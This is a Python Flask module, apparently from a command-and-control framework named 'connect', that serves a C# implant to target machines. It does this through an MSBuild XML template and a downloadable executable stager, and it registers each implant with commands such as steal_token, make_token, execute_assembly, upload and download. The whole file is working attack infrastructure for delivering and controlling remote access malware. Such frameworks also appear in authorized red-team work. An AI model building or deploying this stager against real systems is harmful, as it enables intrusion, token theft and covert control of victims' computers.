import os

from connect.server.models import db, ImplantModel
from connect.server.endpoint import websocket
from connect.generate import digit_identifier, string_identifier
from flask import Blueprint, render_template, request, url_for, send_file

csharp = Blueprint('csharp', __name__, template_folder='resources')
endpoint = digit_identifier()
artifact = string_identifier()
endpoints = f'~server_uri~{endpoint}.xml\n' \
            f'~server_uri~{endpoint}.exe'
commands = 'delay,whoami,hostname,os,pwd,cd,dir,make_token,rev2self,steal_token,get_token,cmd,ps,execute_assembly,download,upload,sleep'


@csharp.route(f'/{endpoint}.xml', methods=['GET'])
def generate_implant():
    """
    csharp Route
    The csharp route expects a get request and will return an implant to be executed on the target(s) machine. The
    implant will attempt to establish a command and control connection to the framework.
    """

    implant = ImplantModel(commands=commands)
    db.session.add(implant)
    db.session.commit()
    websocket.emit('job_sent', 'CSharp implant sent.')

    # noinspection PyUnresolvedReferences
    return render_template('msbuild.xml', check_in_uri=f"{request.host_url}", key=implant.key, sleep=implant.sleep,
                           jitter=implant.jitter, endpoints=implant.endpoints, csharp_uri=f'{request.host_url}{url_for("csharp.csharp_uri")}')


@csharp.route(f'/{endpoint}.exe', methods=['GET'])
def csharp_uri():
    return send_file(f'{os.getcwd()}/connect/server/stagers/csharp/resources/connect.exe')